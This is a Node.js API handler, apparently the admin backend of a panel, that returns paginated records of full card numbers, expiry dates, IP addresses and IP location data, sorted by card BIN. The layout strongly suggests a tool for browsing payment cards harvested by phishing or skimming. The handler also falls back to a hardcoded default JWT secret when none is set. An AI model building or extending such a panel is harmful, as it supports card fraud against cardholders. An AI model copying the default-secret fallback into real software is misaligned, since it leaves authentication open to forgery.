const jwt = require('jsonwebtoken');
const { pool, ensureTables } = require('./lib/db');

const JWT_SECRET = process.env.JWT_SECRET || 'uc-default-secret-change-me';

module.exports = async function handler(req, res) {
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // Verify JWT token
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    const token = authHeader.split(' ')[1];
    try {
        jwt.verify(token, JWT_SECRET);
    } catch (e) {
        return res.status(401).json({ error: 'Invalid or expired token' });
    }

    try {
        await ensureTables();

        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 25;
        const search = req.query.search || '';
        const offset = (page - 1) * limit;

        const client = await pool.connect();
        try {
            let whereClause = '';
            let params = [];
            let paramIndex = 1;

            if (search) {
                whereClause = `WHERE card_number ILIKE $${paramIndex} OR ip_address ILIKE $${paramIndex + 1} OR expiry ILIKE $${paramIndex + 2}`;
                params = [`%${search}%`, `%${search}%`, `%${search}%`];
                paramIndex += 3;
            }

            // Count total
            const countResult = await client.query(
                `SELECT COUNT(*) FROM cards ${whereClause}`,
                params
            );
            const total = parseInt(countResult.rows[0].count);

            // Fetch data ordered by first 6 digits of card_number
            const dataResult = await client.query(
                `SELECT id, card_number, expiry, ip_address, ip_info, created_at 
                 FROM cards ${whereClause}
                 ORDER BY LEFT(REPLACE(card_number, ' ', ''), 6) ASC, created_at DESC
                 LIMIT $${paramIndex} OFFSET $${paramIndex + 1}`,
                [...params, limit, offset]
            );

            return res.status(200).json({
                success: true,
                data: dataResult.rows,
                pagination: {
                    page,
                    limit,
                    total,
                    totalPages: Math.ceil(total / limit)
                }
            });

        } finally {
            client.release();
        }

    } catch (error) {
        console.error('Admin cards error:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
};
